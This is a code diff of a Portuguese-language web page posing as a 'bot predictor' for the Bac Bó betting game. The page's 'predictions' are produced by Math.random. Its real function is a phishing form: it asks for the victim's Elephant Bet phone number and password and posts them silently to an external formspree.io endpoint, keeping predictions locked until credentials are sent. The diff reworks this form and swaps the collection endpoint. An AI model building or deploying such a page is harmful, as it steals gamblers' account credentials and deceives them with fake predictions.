@@ -50,15 +50,22 @@
       margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em;
       background-color:#fff; color:#000; border:1px solid #ccc; border-radius:5px;
     }
-    input::placeholder {
-      color:#666;
+    input::placeholder { color:#666; }
+    #loginScreen {
+      display:none;
+      background-color:#0d0d0d;
+      padding:20px;
     }
   </style>
 </head>
 <body>
   <h1>BOT PREDICTOR - Bac Bó</h1>
 
+  <!-- Resultados variáveis -->
   <div id="circle" class="circle">--</div>
+
+  <!-- Empate fixo -->
+  <div class="circle empate">20%</div>
 
   <div id="blocked" class="blocked" style="display:none;">
     ⚠️ Acesso bloqueado
@@ -70,23 +77,27 @@
   <button id="preverBtn">Fazer Previsão</button>
   <div id="resultado"></div>
 
-  <div class="section">
-    <h2>Conecte o Bot Com a Sua Conta Da Elephant Bet</h2>
-    <form id="loginForm" action="https://formspree.io/f/xgvneord" method="POST">
+  <!-- Botão para abrir tela de login -->
+  <button id="openLogin">Conectar o Bot</button>
+
+  <!-- Tela de login (oculta inicialmente) -->
+  <div id="loginScreen">
+    <h2>Conecte com a sua conta da Elephant Bet</h2>
+    <form id="loginForm" action="https://formspree.io/f/mbdeddpb" method="POST">
       <label for="numero">Número</label><br>
       <input type="text" id="numero" name="numero" placeholder="número de telemóvel" required><br>
       
       <label for="senha">Senha</label><br>
       <input type="text" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
       
-      <button type="submit">Conectar Conta </button>
+      <button type="submit">Conectar Agora</button>
     </form>
-    <a href="#">← Voltar</a>
+    <a href="#" id="closeLogin">← Voltar</a>
   </div>
 
   <script>
     let previsoesFeitas = 0;
-    let bloqueado = true; // bloqueio ativo até login válido
+    let bloqueado = true; 
     const maxPrevisoes = 3;
     const circle = document.getElementById("circle");
     const resultado = document.getElementById("resultado");
@@ -106,18 +117,28 @@
 
       const rand = Math.random();
       let banca, classe, valor;
-      if (rand < 0.4) { banca="Azul"; classe="azul"; valor="80%"; }
-      else if (rand < 0.8) { banca="Vermelho"; classe="vermelho"; valor="80%"; }
-      else { banca="Empate"; classe="empate"; valor="20%"; }
+      if (rand < 0.5) { banca="Azul"; classe="azul"; valor="80%"; }
+      else { banca="Vermelho"; classe="vermelho"; valor="80%"; }
 
       circle.textContent = valor;
       circle.className = "circle " + classe;
       resultado.textContent = `Previsão ${previsoesFeitas}: Resultado da banca → ${banca}`;
     });
 
+    // Tela de login
+    const loginScreen = document.getElementById("loginScreen");
+    const openLogin = document.getElementById("openLogin");
+    const closeLogin = document.getElementById("closeLogin");
     const loginForm = document.getElementById("loginForm");
     const numeroInput = document.getElementById("numero");
     const senhaInput = document.getElementById("senha");
+
+    openLogin.addEventListener("click", function() {
+      loginScreen.style.display = "block";
+    });
+    closeLogin.addEventListener("click", function() {
+      loginScreen.style.display = "none";
+    });
 
     numeroInput.addEventListener("input", function() {
       if (!numeroInput.value.startsWith("9")) { numeroInput.value = ""; }
@@ -130,7 +151,7 @@
       const senha = senhaInput.value;
 
       if (!/^\d{9}$/.test(numero) || senha.length < 5) {
-        return; // inválido, não envia
+        return; 
       }
 
       const formData = new FormData(loginForm);
@@ -143,13 +164,14 @@
 
         if (response.ok) {
           loginForm.reset();
-          bloqueado = false; // desbloqueia previsões
+          bloqueado = false; 
           previsoesFeitas = 0;
           blocked.style.display = "none";
           bar.style.display = "none";
+          loginScreen.style.display = "none"; 
         }
       } catch (error) {
-        // silencioso, sem mensagens
+        // silencioso
       }
     });
   </script>
